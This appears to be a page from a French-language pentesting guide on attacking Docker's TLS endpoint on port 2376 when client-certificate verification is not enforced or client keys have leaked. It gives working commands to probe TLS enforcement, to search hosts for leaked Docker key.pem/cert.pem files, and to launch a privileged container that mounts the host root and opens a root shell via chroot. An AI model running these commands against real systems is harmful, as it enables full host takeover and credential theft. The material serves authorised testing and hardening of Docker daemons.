---
order: 3
title: "TLS faible sur 2376 : atteindre le daemon malgré la sécurité de transport"
description: "Le port 2376 est censé protéger l'API Docker par un TLS mutuel, mais il est souvent mal configuré : vérification TLS désactivée, authentification par certificat client non imposée, ou clés privées laissées lisibles. Dès que l'un de ces cas est vrai, un attaquant atteint la même API de daemon équivalente à root que celle exposée par 2375, simplement sur un canal chiffré."
keywords:
  - docker 2376
  - docker tls
  - tls mutuel
  - tlsverify
  - prise de contrôle de l'hôte
---

# TLS faible sur 2376

Le port 2376 est l'endpoint TLS du daemon Docker, censé être protégé par un TLS mutuel : le serveur présente un certificat, et il devrait exiger que les clients présentent un certificat signé par une CA de confiance (`--tlsverify`). La protection échoue de plusieurs façons courantes : le daemon est démarré avec `--tls` mais pas `--tlsverify`, de sorte que n'importe quel client se connecte sans certificat ; la CA fait confiance à des certificats de manière trop large ; ou la clé et le certificat client sont laissés lisibles par tous sur un hôte que l'attaquant contrôle déjà en partie. Dans chaque cas, l'attaquant atteint la même API équivalente à root qu'un 2375 ouvert, simplement sur TLS.

Sondez la posture TLS :

```bash
# Is client-certificate auth actually enforced?
curl -sk https://<target>:2376/version                # a version response without a client cert => not enforced
openssl s_client -connect <target>:2376 </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer
# If client certs are required, look for leaked key material
find / -name 'key.pem' -o -name 'cert.pem' -o -name 'ca.pem' 2>/dev/null | grep -i docker
```

## Routes

```bash
# 1. tlsverify not enforced: connect with TLS but no client cert
export DOCKER_HOST=tcp://<target>:2376 DOCKER_TLS=1
docker --tls -H tcp://<target>:2376 info

# 2. Leaked client certs: use them to authenticate as a trusted client
docker --tlsverify --tlscert=cert.pem --tlskey=key.pem --tlscacert=ca.pem \
  -H tcp://<target>:2376 run -v /:/host --privileged --rm -it alpine chroot /host sh
```

Une fois connecté, l'étape de prise de contrôle de l'hôte est identique au cas non authentifié : un conteneur privilégié qui monte la racine de l'hôte.

## Notes d'exploitation

- La question clé est de savoir si le serveur impose les certificats client, pas si le TLS est présent ; une réponse `version` à une requête sans certificat client prouve qu'il ne le fait pas, et le daemon est aussi exposé qu'un 2375.
- Les paires `cert.pem`/`key.pem` fuitées sont courantes sur les runners CI, les hôtes d'orchestration et les machines de développeurs qui gèrent un daemon distant ; une paire lisible vous authentifie comme un client de confiance.
- Après vous être connecté, procédez exactement comme dans [Accès non authentifié au daemon](unauthenticated-daemon-access.md) et [Prise de contrôle de l'hôte via un run privilégié](host-takeover-via-privileged-run.md).

## Références

- [Docker: protect the daemon socket with TLS](https://docs.docker.com/engine/security/protect-access/)
- [HackTricks: 2376 Docker TLS](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
